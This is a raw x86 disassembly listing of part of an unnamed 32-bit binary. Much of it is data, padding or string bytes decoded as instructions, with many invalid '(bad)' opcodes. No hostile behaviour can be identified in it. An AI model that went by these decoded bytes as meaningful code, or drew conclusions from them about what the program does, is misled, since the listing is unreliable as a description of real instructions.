  413bfa:	imul   si,WORD PTR [ecx],0xff85
  413bfe:	pushf  
  413bff:	clc    
  413c00:	sahf   
  413c01:	jmp    0x4f04356
  413c06:	add    BYTE PTR [eax],al
  413c08:	lods   al,BYTE PTR ds:[esi]
  413c09:	cmp    DWORD PTR [ecx+0x0],eax
  413c0c:	pushf  
  413c0d:	or     eax,DWORD PTR [esi+ecx*1]
	...
  413c40:	addr16 jg 0x413c83
  413c43:	add    BYTE PTR [edx+0x11],ch
  413c46:	inc    ebx
  413c47:	add    BYTE PTR [eax],al
  413c49:	add    BYTE PTR [eax],al
  413c4b:	add    BYTE PTR [eax+eax*1+0x46],al
  413c4f:	add    BYTE PTR [ecx+0x0],ch
  413c52:	outs   dx,DWORD PTR ds:[esi]
  413c53:	add    BYTE PTR [edx+0x0],cl
  413c56:	dec    ecx
  413c57:	add    BYTE PTR [eax+eax*1+0x46],al
  413c5b:	add    BYTE PTR [eax+eax*1+0x49],cl
  413c5f:	add    BYTE PTR [ebp+0x0],dl
  413c62:	inc    esi
  413c63:	add    BYTE PTR [edi+0x0],cl
  413c66:	imul   eax,DWORD PTR [eax],0x6f
  413c69:	add    BYTE PTR [edx+0x0],ch
  413c6c:	dec    ebx
  413c6d:	add    BYTE PTR [eax+eax*1+0x66],cl
  413c71:	add    BYTE PTR [edx+0x0],ch
  413c74:	imul   eax,DWORD PTR [eax],0x46006f
  413c7a:	jo     0x413c7c
  413c7c:	outs   dx,DWORD PTR ds:[esi]
  413c7d:	add    BYTE PTR [ebx+0x0],ch
  413c80:	ins    DWORD PTR es:[edi],dx
  413c81:	add    BYTE PTR [eax+eax*1+0x6b],ah
  413c85:	add    BYTE PTR [ebx+0x0],dh
  413c88:	ins    BYTE PTR es:[edi],dx
  413c89:	add    BYTE PTR [edx+0x0],ch
  413c8c:	data16 add BYTE PTR [edi+0x0],ah
  413c90:	imul   eax,DWORD PTR [eax],0x64006f
  413c96:	add    BYTE PTR [di+0x0],dh
  413c9a:	imul   eax,DWORD PTR [eax],0x69006a
  413ca0:	outs   dx,DWORD PTR ds:[esi]
  413ca1:	add    BYTE PTR [esi+0x0],ah
  413ca4:	add    BYTE PTR fs:[ebp+0x0],dh
  413ca8:	push   0x0
  413caa:	add    BYTE PTR [bp+0x0],ah
  413cae:	add    BYTE PTR fs:[eax],al
  413cb1:	add    BYTE PTR [eax],al
  413cb3:	add    BYTE PTR [edx+0x0],cl
  413cb6:	inc    esp
  413cb7:	add    BYTE PTR [ebx+0x0],cl
  413cba:	dec    edx
  413cbb:	add    BYTE PTR [edx+0x0],ch
  413cbe:	imul   eax,DWORD PTR [eax],0x64
  413cc1:	add    BYTE PTR [ebx+0x0],cl
  413cc4:	dec    esp
  413cc5:	add    BYTE PTR [edx+0x0],cl
  413cc8:	add    BYTE PTR fs:[ecx+0x0],ch
  413ccc:	ins    BYTE PTR es:[edi],dx
  413ccd:	add    BYTE PTR [edx+0x0],cl
  413cd0:	ins    BYTE PTR es:[edi],dx
  413cd1:	add    BYTE PTR [ebx+0x0],ch
  413cd4:	add    BYTE PTR fs:[edx+0x0],ch
  413cd8:	dec    esp
  413cd9:	add    BYTE PTR [ebp+0x0],dl
  413cdc:	inc    esp
  413cdd:	add    BYTE PTR [edi+0x0],ch
  413ce0:	imul   eax,DWORD PTR [eax],0x73006c
  413ce6:	push   0x0
  413ce8:	add    BYTE PTR fs:[ebx+0x0],ch
  413cec:	imul   eax,DWORD PTR [eax],0x6a
  413cef:	add    BYTE PTR [esi+0x0],ah
  413cf2:	add    BYTE PTR fs:[ebx+0x0],dh
  413cf6:	imul   eax,DWORD PTR [eax],0x6a
  413cf9:	add    BYTE PTR [esi+0x0],ah
  413cfc:	imul   eax,DWORD PTR [eax],0x64
  413cff:	add    BYTE PTR [ebx+0x0],dh
  413d02:	add    BYTE PTR [eax],al
  413d04:	dec    edx
  413d05:	inc    esp
  413d06:	dec    ebx
  413d07:	dec    edx
  413d08:	push   0x6b
  413d0a:	fs dec ebx
  413d0c:	dec    esp
  413d0d:	dec    edx
  413d0e:	imul   ebp,DWORD PTR fs:[edx+ecx*2+0x6c],0x4c6a646b
  413d17:	push   ebp
  413d18:	inc    esp
  413d19:	outs   dx,DWORD PTR ds:[esi]
  413d1a:	imul   ebp,DWORD PTR [ebx+esi*2+0x6a],0x6a6b6b64
  413d22:	data16 fs jae 0x413d91
  413d26:	push   0x66
  413d28:	imul   esp,DWORD PTR [ebx+esi*2+0x0],0x0
  413d2d:	add    BYTE PTR [eax],al
  413d2f:	add    BYTE PTR [eax],al
  413d31:	add    BYTE PTR [eax],al
  413d33:	add    BYTE PTR [ebp-0x68],cl
  413d36:	inc    eax
  413d37:	add    BYTE PTR [ebp+0x4f],dl
  413d3a:	pop    edi
  413d3b:	dec    edi
  413d3c:	dec    esp
  413d3d:	dec    edi
  413d3e:	push   eax
  413d3f:	dec    edi
  413d40:	pop    edi
  413d41:	dec    edi
  413d42:	push   esi
  413d43:	dec    edi
  413d44:	or     eax,0xc24f0c4f
  413d49:	dec    esi
  413d4a:	add    BYTE PTR [eax],al
  413d4c:	pop    ecx
  413d4d:	dec    edi
  413d4e:	pop    esi
  413d4f:	dec    edi
  413d50:	pop    ebx
  413d51:	dec    edi
  413d52:	or     eax,0xc24f0c4f
  413d57:	dec    esi
  413d58:	dec    edi
  413d59:	dec    edi
  413d5a:	dec    ebp
  413d5b:	dec    edi
  413d5c:	pop    edi
  413d5d:	dec    edi
  413d5e:	dec    esp
  413d5f:	dec    edi
  413d60:	or     eax,0xc24f0c4f
  413d65:	dec    esi
  413d66:	add    BYTE PTR [eax],al
  413d68:	dec    ebp
  413d69:	dec    edi
  413d6a:	pop    edx
  413d6b:	dec    edi
  413d6c:	push   esi
  413d6d:	dec    edi
  413d6e:	dec    ecx
  413d6f:	dec    edi
  413d70:	arpl   WORD PTR [edi+0x52],cx
  413d73:	dec    edi
  413d74:	pop    ebx
  413d75:	dec    edi
  413d76:	ret    0x4e
  413d79:	add    BYTE PTR [eax],al
  413d7b:	add    BYTE PTR [esi+0x7d],ch
  413d7e:	outs   dx,BYTE PTR ds:[esi]
  413d7f:	lea    ebp,[esi-0x63]
  413d82:	outs   dx,BYTE PTR ds:[esi]
  413d83:	lods   eax,DWORD PTR ds:[esi]
  413d84:	outs   dx,BYTE PTR ds:[esi]
  413d85:	mov    ebp,0xdd6ecd6e
  413d8a:	outs   dx,BYTE PTR ds:[esi]
  413d8b:	in     eax,dx
  413d8c:	outs   dx,BYTE PTR ds:[esi]
  413d8d:	std    
  413d8e:	outs   dx,BYTE PTR ds:[esi]
  413d8f:	or     eax,0x2d6e1d6e
  413d94:	outs   dx,BYTE PTR ds:[esi]
  413d95:	cmp    eax,0x6d6e5d6e
  413d9a:	outs   dx,BYTE PTR ds:[esi]
  413d9b:	jb     0x413e0b
  413d9d:	jae    0x413e0d
  413d9f:	jo     0x413e0f
  413da1:	jno    0x413e11
  413da3:	jbe    0x413e13
  413da5:	ja     0x413e15
  413da7:	je     0x413e17
  413da9:	jne    0x413e19
  413dab:	mov    ch,BYTE PTR [esi-0x75]
  413dae:	outs   dx,BYTE PTR ds:[esi]
  413daf:	mov    BYTE PTR [esi-0x77],ch
  413db2:	outs   dx,BYTE PTR ds:[esi]
  413db3:	mov    gs,WORD PTR [esi+0x7c]
  413db6:	pop    esi
  413db7:	jge    0x413e07
  413db9:	jge    0x413d79
  413dbb:	jge    0x413e15
  413dbd:	(bad)  
  413dbe:	jns    0x413e30
  413dc0:	mov    ecx,0x7d736eb1
  413dc5:	bound  ebp,QWORD PTR [edx+0x7c265fc6]
  413dcb:	add    BYTE PTR [ecx+0x17],cl
  413dce:	mov    ebx,0x4af4b956
  413dd3:	aaa    
  413dd4:	dec    edx
  413dd5:	jle    0x413d70
  413dd7:	jno    0x413e39
  413dd9:	mov    cl,0x4
  413ddb:	imul   ebp,DWORD PTR [eax-0x70282bf8],0x5
  413de2:	inc    esp
  413de3:	xlat   BYTE PTR ds:[ebx]
  413de4:	rcl    DWORD PTR [ebx+0x7dd01148],1
  413dea:	rcr    esi,cl
  413dec:	(bad)  
  413ded:	leave  
  413dee:	xchg   BYTE PTR [esi+0x1faa3210],ah
  413df4:	fs icebp 
  413df6:	push   eax
  413df7:	(bad)  
  413df8:	rcr    DWORD PTR [eax],1
  413dfa:	shl    DWORD PTR [ecx+0x0],1
  413dfd:	add    BYTE PTR [eax],al
  413dff:	add    bh,ch
  413e01:	(bad)  [ebx+0x7]
  413e04:	or     BYTE PTR [ecx+eax*2],bh
  413e07:	add    BYTE PTR [esi+0x30],al
  413e0a:	shl    DWORD PTR [ebx],0x38
  413e0d:	and    eax,DWORD PTR [ecx+0x0]
  413e10:	inc    esi
  413e11:	push   ebx
  413e12:	outs   dx,DWORD PTR ds:[esi]
  413e13:	push   ebx
  413e14:	mov    al,ds:0x400413b
  413e19:	cmp    al,0x41
  413e1b:	add    BYTE PTR [edi+0x712ed],cl
	...
  413e3d:	add    BYTE PTR [eax],al
  413e3f:	add    BYTE PTR [edi+0x78],dl
  413e42:	popa   
  413e43:	push   edi
  413e44:	push   esi
  413e45:	push   esp
  413e46:	dec    eax
  413e47:	je     0x413e95
  413e49:	push   ebx
  413e4a:	jne    0x413eb7
  413e4c:	popa   
  413e4d:	jns    0x413e94
  413e4f:	pop    ecx
  413e50:	je     0x413e9a
  413e52:	push   ebp
  413e53:	jp     0x413eab
  413e55:	jp     0x413ed0
  413e57:	js     0x413ec9
  413e59:	imul   edx,DWORD PTR [edi+0x6d],0x48
  413e5d:	push   eax
  413e5e:	dec    eax
  413e5f:	dec    edx
  413e60:	outs   dx,BYTE PTR ds:[esi]
  413e61:	push   esp
  413e62:	pop    ecx
  413e63:	dec    edx
  413e64:	dec    ebx
  413e65:	dec    ebp
  413e66:	dec    esi
  413e67:	je     0x413e69
	...
  413e79:	add    BYTE PTR [eax],al
  413e7b:	add    BYTE PTR [ebp+0x70],ch
  413e7e:	ins    DWORD PTR es:[edi],dx
  413e7f:	push   esp
  413e80:	dec    esi
  413e81:	jne    0x413ed4
  413e83:	outs   dx,BYTE PTR ds:[esi]
  413e84:	imul   eax,DWORD PTR [edx+0x73],0x58516165
  413e8b:	pop    ecx
  413e8c:	outs   dx,BYTE PTR ds:[esi]
  413e8d:	jbe    0x413f07
  413e8f:	jns    0x413f08
  413e91:	dec    ebp
  413e92:	je     0x413f0a
  413e94:	bound  eax,QWORD PTR [ebx+eiz*2+0x7a]
  413e98:	push   esp
  413e99:	arpl   WORD PTR [ecx+0x4b],cx
  413e9c:	push   edx
  413e9d:	imul   ebp,DWORD PTR [eax+0x73],0x6a4a5170
  413ea4:	add    BYTE PTR [eax],al
  413ea6:	inc    edi
  413ea7:	jne    0x413eef
  413ea9:	push   ebx
  413eaa:	outs   dx,DWORD PTR ds:[esi]
  413eab:	push   ebx
  413eac:	inc    esi
  413ead:	inc    edi
  413eae:	push   0x66495949
  413eb3:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  413eb7:	push   esi
  413eb8:	jb     0x413f22
  413eba:	add    BYTE PTR [eax],al
  413ebc:	ins    BYTE PTR es:[edi],dx
  413ebd:	jb     0x413f38
  413ebf:	inc    edi
  413ec0:	push   edi
  413ec1:	push   esi
  413ec2:	inc    edi
  413ec3:	ins    BYTE PTR es:[edi],dx
  413ec4:	inc    ecx
  413ec5:	inc    edi
  413ec6:	jae    0x413ec8
  413ec8:	dec    edi
  413ec9:	inc    ebx
  413eca:	jo     0x413f3e
  413ecc:	data16 jp 0x413f21
  413ecf:	jp     0x413f29
  413ed1:	ins    BYTE PTR es:[edi],dx
  413ed2:	je     0x413f43
  413ed4:	jns    0x413f44
  413ed6:	popa   
  413ed7:	push   esi
  413ed8:	push   ebp
  413ed9:	push   0x57564476
  413ede:	dec    edx
  413edf:	imul   edx,DWORD PTR [ebx+0x4b],0x5065
  413ee6:	inc    ecx
  413ee7:	jp     0x413f59
  413ee9:	pop    eax
  413eea:	inc    esi
  413eeb:	jae    0x413f62
  413eed:	dec    esi
  413eee:	dec    edx
  413eef:	gs push eax
  413ef1:	jne    0x413ef3
  413ef3:	add    ah,ah
  413ef5:	cmc    
  413ef6:	jnp    0x413f46
  413ef8:	jnp    0x413ec8
  413efa:	cmc    
  413efb:	call   FWORD PTR [ebx+0x61]
  413efe:	and    bh,dl
  413f00:	mov    ds:0xdc009995,al
  413f05:	rol    DWORD PTR [eax],1
  413f07:	add    BYTE PTR ds:0x77000001,al
  413f0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f0e:	fnstsw WORD PTR [esi-0x7f]
  413f11:	cli    
  413f12:	or     DWORD PTR [ebp-0x22],esp
  413f15:	xchg   DWORD PTR [eax-0x48],edx
  413f18:	mov    WORD PTR [ecx],gs
  413f1a:	pop    es
  413f1b:	mov    cl,0xb5
  413f1d:	jne    0x413f2b
  413f1f:	push   edx
  413f20:	or     eax,0xf3c3ad83
  413f25:	mov    ?,WORD PTR [edi+0x43a13999]
  413f2b:	xor    eax,DWORD PTR [edi]
  413f2d:	gs (bad) 
  413f2f:	xchg   edi,eax
  413f30:	retf   
  413f31:	dec    eax
  413f32:	pop    eax
  413f33:	cdq    
  413f34:	ficomp WORD PTR fs:[edi-0x7271aaf3]
  413f3b:	mov    eax,ds:0xc3ffb9ad
  413f40:	push   edx
  413f41:	shl    BYTE PTR [eax+0x46ee3933],0x5d
  413f48:	and    BYTE PTR ds:0x94822731,cl
  413f4e:	push   ss
  413f4f:	mov    DWORD PTR [eax-0x30],ebx
  413f52:	iret   
  413f53:	loope  0x413f15
  413f55:	(bad)  
  413f56:	les    ebp,FWORD PTR [ecx-0x34f005a7]
  413f5c:	ret    0x8237
  413f5f:	mov    DWORD PTR [ecx+0x21],esp
  413f62:	inc    ebx
  413f63:	cmp    BYTE PTR [ecx+0x7a98b20a],ch
  413f69:	mov    bh,0xe7
  413f6b:	outs   dx,BYTE PTR ds:[esi]
  413f6c:	stos   BYTE PTR es:[edi],al
  413f6d:	mov    dl,0x46
  413f6f:	inc    esp
  413f70:	and    eax,0x64897eba
  413f75:	mov    ds:0x46f27550,eax
  413f7a:	mov    dl,0x72
  413f7c:	jmp    0xa4a7:0xb04d2a48
  413f83:	ins    DWORD PTR es:[edi],dx
  413f84:	pop    ebx
  413f85:	push   ebp
  413f86:	(bad)  
  413f88:	or     DWORD PTR [ebx],ebx
  413f8a:	out    0x97,eax
  413f8c:	test   DWORD PTR [ebx],esi
  413f8e:	shl    dh,0x63
  413f91:	shr    DWORD PTR [edx-0x779f849],0x3e
  413f98:	mov    bh,0xe7
  413f9a:	pop    ebp
  413f9b:	(bad)  
  413f9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f9d:	fwait
  413f9e:	sub    bh,BYTE PTR [edi]
  413fa0:	arpl   WORD PTR [eax],ax
  413fa2:	xor    ebx,DWORD PTR [ebx+0x42]
  413fa5:	pushf  
  413fa6:	stos   DWORD PTR es:[edi],eax
  413fa7:	rcl    DWORD PTR [esi+0x10],cl
  413faa:	out    dx,al
  413fab:	rep ins BYTE PTR es:[edi],dx
  413fad:	push   edi
  413fae:	fnstcw WORD PTR [esi+0x33c0ab48]
  413fb4:	ja     0x413f4e
  413fb6:	and    di,bx
  413fb9:	pop    ss
  413fba:	mov    edx,0xd0520cd6
  413fbf:	pushf  
  413fc0:	inc    ebx
  413fc1:	mov    ebx,0x61319ab7
  413fc6:	clc    
  413fc7:	xchg   edi,eax
  413fc8:	sub    DWORD PTR [esi],ebp
  413fca:	and    eax,0x98aa86f5
  413fcf:	xor    ecx,DWORD PTR [ecx+0x48]
  413fd2:	les    ebp,FWORD PTR [ebx]
  413fd4:	cld    
  413fd5:	pop    ebx
  413fd6:	imul   BYTE PTR [edi+0x78dd9b7a]
  413fdc:	jecxz  0x413fcd
  413fde:	lar    ecx,WORD PTR [ebx-0x234c564d]
  413fe5:	push   ds
  413fe6:	(bad)  
  413fe7:	int3   
  413fe8:	jp     0x41405c
  413fea:	inc    BYTE PTR [esp+eiz*4]
  413fed:	inc    esp
  413fee:	inc    edi
  413fef:	mov    ds:0x66c42393,eax
  413ff4:	inc    esi
  413ff5:	mov    BYTE PTR [ecx+0x53d7b775],bl
  413ffb:	mov    ds:0x7e028b11,eax
  414000:	ret    0x19ba
  414003:	pop    ds
  414004:	push   edi
  414005:	xor    DWORD PTR [ecx],edi
  414007:	int3   
  414008:	in     eax,0x99
  41400a:	cmp    al,0xc9
  41400c:	call   0x207baba6
	...
  414071:	add    BYTE PTR [eax],al
  414073:	add    BYTE PTR [edx-0x26],bl
  414076:	push   esi
  414077:	pusha  
  414078:	(bad)  
  414079:	in     al,dx
  41407a:	jle    0x414076
  41407c:	call   0xf86b:0xb4d52e96
  414083:	(bad)  
  414084:	loope  0x414058
  414086:	add    BYTE PTR [eax],al
  414088:	add    eax,0x78000001
  41408d:	int    0x2f
  41408f:	push   edi
  414090:	(bad)  
  414091:	mov    dl,0xdd
  414093:	inc    ebp
  414094:	repnz dec edi
  414096:	push   0x10
  414098:	add    DWORD PTR [edx-0x3b0c5491],ecx
  41409e:	xchg   BYTE PTR [ecx-0x11d4e974],bh
  4140a4:	dec    ebx
  4140a5:	rol    BYTE PTR ds:0xe013c4c8,0xcd
  4140ac:	pop    esp
  4140ad:	mov    ?,WORD PTR [eax-0x4f422287]
  4140b3:	stos   BYTE PTR es:[edi],al
  4140b4:	out    dx,al
  4140b5:	fcom   st(1)
  4140b7:	mov    cl,0xe1
  4140b9:	mov    dl,BYTE PTR [edi]
  4140bb:	je     0x414110
  4140bd:	or     edx,DWORD PTR [edx-0x3]
  4140c0:	shl    DWORD PTR [ebx+0x63],cl
  4140c3:	or     ah,BYTE PTR [edx+0x74ad10d5]
  4140c9:	or     esp,ecx
  4140cb:	addr16 inc edx
  4140cd:	cmc    
  4140ce:	jnp    0x414118
  4140d0:	das    
  4140d1:	retf   
  4140d2:	(bad)  
  4140d3:	sub    al,0x6a
  4140d5:	fucomp st(3)
  4140d7:	shr    BYTE PTR [ebp-0x419d5ddd],1
  4140dd:	(bad)  
  4140de:	in     al,0x8
  4140e0:	lahf   
  4140e1:	daa    
  4140e2:	cmp    BYTE PTR [edi+0x1c],dh
  4140e5:	test   al,0xb6
  4140e7:	lock ins BYTE PTR es:[edi],dx
  4140e9:	inc    edx
  4140ea:	xchg   edi,eax
  4140eb:	xor    BYTE PTR [ecx],bl
  4140ed:	es shr edi,0x39
  4140f1:	dec    esp
  4140f2:	mov    ecx,0x91af2349
  4140f7:	pop    ss
  4140f8:	sub    BYTE PTR [ebx+0x5df028fc],0x63
  4140ff:	outs   dx,BYTE PTR ds:[esi]
  414100:	mov    dh,0xd8
  414102:	mov    al,0xe
  414104:	leave  
  414105:	push   ebp
  414106:	sub    dl,BYTE PTR [eax-0x640642d2]
  41410c:	sub    BYTE PTR [ebp+0x47],bl
  41410f:	mov    ss,WORD PTR ds:0xf701ec0d
  414115:	mov    dl,0x41
  414117:	lods   eax,DWORD PTR ds:[esi]
  414118:	push   cs
  414119:	xor    ebp,DWORD PTR [edi+eax*8+0x2285883d]
  414120:	test   eax,0xfc6c2245
  414125:	dec    eax
  414126:	cld    
  414127:	mov    DWORD PTR [edx],esp
  414129:	xchg   ebx,eax
  41412a:	scas   eax,DWORD PTR es:[edi]
  41412b:	loopne 0x41411a
  41412d:	cmp    al,0x73
  41412f:	lods   al,BYTE PTR ds:[esi]
  414130:	fistp  DWORD PTR [ebx-0x3b]
  414133:	inc    ebx
  414134:	out    dx,al
  414135:	daa    
  414136:	clc    
  414137:	cmp    al,0x7
  414139:	into   
  41413a:	mov    ebp,0xc3ca6d04
  41413f:	add    ah,cl
  414141:	adc    DWORD PTR [edi+ebp*2-0x32059bb0],edx
  414148:	xor    DWORD PTR [edi],edx
  41414a:	mov    esi,0x391c4909
  41414f:	mov    esi,ecx
  414151:	push   esi
  414152:	stos   BYTE PTR es:[edi],al
  414153:	dec    esi
  414154:	xor    edx,eax
  414156:	ins    DWORD PTR es:[di],dx
  414158:	adc    ecx,DWORD PTR [ebx+0x7e132ada]
  41415e:	sub    bl,BYTE PTR [edx+0x58b0829]
  414164:	pextrw edx,(bad),0xc5
  414166:	adc    BYTE PTR [edi+edi*1],bl
  414169:	inc    ebx
  41416a:	mov    edi,0x550bb982
  41416f:	jle    0x4141af
  414171:	mov    esp,0x63d75221
  414176:	loop   0x414174
  414178:	std    
  414179:	out    dx,eax
  41417a:	jae    0x41413a
  41417c:	fldenv [ebx+0x8]
  41417f:	inc    ebx
  414180:	pushf  
  414181:	or     edi,DWORD PTR [ebx]
  414183:	mov    WORD PTR [eax],fs
  414185:	cwde   
  414186:	cli    
  414187:	ds pop edi
  414189:	cs push 0x12
  41418c:	(bad)  
  41418d:	ins    DWORD PTR es:[edi],dx
  41418e:	adc    DWORD PTR [ebp-0x3a],0x0
	...
  4141f2:	add    BYTE PTR [eax],al
  4141f4:	add    dl,BYTE PTR [edx]
  4141f6:	add    DWORD PTR [ebx-0x4c5d4cef],esp
  4141fc:	mov    DWORD PTR [ecx+0x37],edx
  4141ff:	push   edi
  414200:	sbb    eax,0xe6f3dbce
  414205:	rol    DWORD PTR [eax],cl
  414207:	add    BYTE PTR ds:0xca000001,al
  41420d:	(bad)  
  41420e:	fistp  QWORD PTR [eax+0x17cfbc7d]
  414214:	pop    esi
  414216:	mov    BYTE PTR [eax],bl
  414218:	pusha  
  414219:	adc    dh,dh
  41421b:	scas   eax,DWORD PTR es:[edi]
  41421c:	jno    0x414275
  41421e:	push   esi
  41421f:	mov    DWORD PTR [edx+0x1d],esi
  414222:	add    bh,ch
  414224:	xchg   ebp,eax
  414225:	(bad)  
  414226:	rcl    BYTE PTR [eax+esi*4],1
  414229:	push   cs
  41422a:	or     eax,0x324220ba
  41422f:	and    DWORD PTR [ebp-0x5],0xffffffb2
  414233:	(bad)
  414237:	pop    ss
  414238:	and    dh,0x8d
  41423b:	nop
  41423c:	repnz int3 
  41423e:	popf   
  41423f:	jo     0x4141f3
  414241:	sub    DWORD PTR ds:0xa972441d,edx
  414247:	sbb    BYTE PTR [ecx-0x39],0xa0
  41424b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41424c:	sbb    dh,bl
  41424e:	test   al,0xb4
  414250:	mov    dh,0x5f
  414252:	shr    DWORD PTR [ecx-0x6e59f006],1
  414258:	jecxz  0x4142cb
  41425a:	sbb    al,BYTE PTR [eax]
  41425c:	stos   DWORD PTR es:[edi],eax
  41425d:	adc    BYTE PTR [esp+eiz*4+0x43],ah
  414261:	lods   al,BYTE PTR ds:[esi]
  414262:	cmp    eax,0xc5f21c57
  414267:	add    BYTE PTR [ecx-0x4f],0x52
  41426b:	mov    ch,0x8b
  41426d:	xchg   ebp,eax
  41426e:	nop
  41426f:	fldl2t 
  414271:	inc    eax
  414272:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  414274:	iret   
  414275:	rcl    DWORD PTR [esi],0x21
  414278:	jb     0x414216
  41427a:	ds mov ecx,0x246a20a2
  414280:	stc    
  414281:	cld    
  414282:	jbe    0x414301
  414284:	add    al,0x20
  414286:	pop    ss
  414287:	sbb    eax,0xdf11da82
  41428c:	fstp   DWORD PTR [edx+0x6a]
  41428f:	aam    0x3f
  414291:	mov    BYTE PTR [ebp+0x45],dl
  414294:	push   ebp
  414295:	sub    eax,0x5ea82160
  41429a:	jmp    0x4142c0
  41429c:	in     al,0xaa
  41429e:	(bad)  
  41429f:	cmp    eax,0x71874a5a
  4142a4:	fs xlat BYTE PTR fs:[ebx]
  4142a7:	sbb    eax,0x6fd5fa9a
  4142ac:	add    al,0x32
  4142ae:	inc    esp
  4142af:	sbb    ecx,DWORD PTR ds:0xded5ac9c
  4142b5:	jns    0x414242
  4142b7:	mov    esp,0xaefa2efc
  4142bc:	adc    al,0xe3
  4142be:	into   
  4142bf:	push   0xf7d05948
  4142c4:	xchg   esp,eax
  4142c5:	(bad)  
  4142c6:	pop    edx
  4142c7:	sub    al,bh
  4142c9:	icebp  
  4142ca:	pop    es
  4142cb:	bound  ebp,QWORD PTR [edx-0x4e1cbf06]
  4142d1:	call   0xc2807cec
  4142d6:	pop    ebx
  4142d7:	lods   eax,DWORD PTR ds:[esi]
  4142d9:	push   ebp
  4142da:	mov    dh,0xb1
  4142dc:	jnp    0x414359
  4142de:	sbb    al,0x85
  4142e0:	or     dl,ah
  4142e2:	jns    0x414280
  4142e4:	mov    WORD PTR [esi-0x7791d09b],gs
  4142ea:	inc    edi
  4142eb:	fimul  DWORD PTR [ebp+0xd28bab3]
  4142f1:	inc    ebp
  4142f2:	mov    cl,0xe0
  4142f4:	lock and eax,0xfc3864c7
  4142fa:	sbb    eax,edx
  4142fc:	push   ebx
  4142fd:	(bad)  
  4142fe:	mov    dl,0x75
  414300:	pop    eax
  414301:	xchg   DWORD PTR [edi-0x40],ebx
  414304:	rcr    DWORD PTR [esi],cl
  414306:	inc    edx
  414307:	cmc    
  414308:	inc    ecx
  414309:	xchg   ebp,eax
  41430a:	adc    al,0x1f
  41430c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41430d:	mov    bh,0xa5
  41430f:	dec    esp
  414310:	imul   eax,DWORD PTR [eax],0x0
	...
  414373:	add    BYTE PTR [ecx],al
  414375:	sub    DWORD PTR [ebp-0x23],0xddb1fded
  41437c:	rol    DWORD PTR [ebp+0x5e],0xa1
  414380:	lahf   
  414381:	pushf  
  414382:	mov    edi,ecx
  414384:	jmp    0x41435a
  414386:	add    BYTE PTR [eax],al
  414388:	add    eax,0x3d000001
  41438d:	jge    0x414352
  41438f:	sbb    al,0x90
  414391:	clc    
  414392:	(bad)  
  414393:	in     al,dx
  414394:	jl     0x4143ca
  414396:	or     al,0x6d
  414398:	scas   eax,DWORD PTR es:[edi]
  414399:	sbb    DWORD PTR [ecx+0x10],esp
  41439c:	inc    eax
  41439d:	(bad)  
  41439e:	mov    ch,BYTE PTR [eax+0x2a]
  4143a1:	imul   edi,DWORD PTR [ecx-0x3509f04e],0xe397fe36
  4143ab:	push   ds
  4143ac:	sbb    edx,DWORD PTR [ecx+0x3b]
  4143af:	xchg   esp,eax
  4143b0:	push   es
  4143b1:	(bad)  
  4143b2:	pop    ds
  4143b3:	fcmovu st,st(4)
  4143b5:	in     eax,0x96
  4143b7:	(bad)  
  4143b8:	mov    bh,ah
  4143ba:	xchg   ebp,eax
  4143bb:	call   0x1057:0x23be6dbf
  4143c2:	mov    bl,0x13
  4143c4:	fcom   QWORD PTR ds:0x16589c96
  4143ca:	lds    edx,FWORD PTR [ebp+0x52]
  4143cd:	and    ebx,ebp
  4143cf:	pop    ss
  4143d0:	nop
  4143d1:	out    0xd0,al
  4143d3:	cmp    al,0x9e
  4143d5:	add    DWORD PTR [esp+esi*4-0x7f],ecx
  4143d9:	out    dx,eax
  4143da:	jb     0x414396
  4143dc:	fisttp WORD PTR [edi]
  4143de:	cmp    BYTE PTR [ebx-0x4f40b998],ah
  4143e4:	outs   dx,BYTE PTR ds:[esi]
  4143e5:	popa   
  4143e6:	(bad)  
  4143e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4143e8:	popf   
  4143e9:	sub    DWORD PTR [edx-0x3f],ebp
  4143ec:	jge    0x4143cb
  4143ee:	mov    ch,0xee
  4143f0:	and    bl,dh
  4143f2:	bound  esi,QWORD PTR [esi-0x4c29cdde]
  4143f8:	sti    
  4143f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143fa:	adc    ebp,ecx
  4143fc:	(bad)  
  4143fd:	in     al,0x28
  4143ff:	sub    bh,BYTE PTR [ecx-0x558691d2]
  414405:	push   ecx
  414406:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414407:	pushf  
  414408:	fisttp DWORD PTR [edx-0x1]
  41440b:	das    
  41440c:	(bad)  
  41440d:	pop    ecx
  41440e:	ret    
  41440f:	cmp    bl,cl
  414411:	mov    bh,0x0
  414413:	adc    al,0x2b
  414415:	rcl    eax,1
  414417:	stc    
  414418:	mov    eax,0x5c388b68
  41441d:	xchg   ebx,eax
  41441e:	fucomp st(5)
  414420:	scas   al,BYTE PTR es:[edi]
  414421:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414422:	sbb    esi,ecx
  414424:	scas   eax,DWORD PTR es:[edi]
  414425:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414426:	lahf   
  414427:	sbb    ebp,DWORD PTR [ecx]
  414429:	mov    esp,0x2cbe5c51
  41442e:	repz or DWORD PTR [eax+0x50],edx
  414432:	cmp    dh,dl
  414434:	pop    ebx
  414435:	dec    edi
  414436:	test   al,0x39
  414438:	xlat   BYTE PTR ds:[bx]
  41443a:	ins    BYTE PTR es:[edi],dx
  41443b:	jbe    0x41446d
  41443d:	jmp    0x5f75f11c
  414442:	xor    al,0xee
  414444:	push   edi
  414445:	leave  
  414446:	shl    BYTE PTR [ecx-0x523c4a9b],1
  41444c:	mov    esi,DWORD PTR [ebx-0x3f]
  41444f:	xchg   edx,eax
  414450:	ss int3 
  414452:	sub    al,0x85
  414454:	lahf   
  414455:	sar    bh,1
  414457:	jmp    0x414476
  414459:	int3   
  41445a:	ds sbb al,0x33
  41445d:	xchg   ebp,eax
  41445e:	aam    0x5c
  414460:	and    DWORD PTR [ebx],eax
  414462:	stc    
  414463:	fisttp DWORD PTR [edi]
  414465:	ret    
  414466:	fldenv [edi+edi*8]
  414469:	pop    eax
  41446a:	pop    edx
  41446b:	lods   al,BYTE PTR es:[esi]
  41446d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41446e:	push   eax
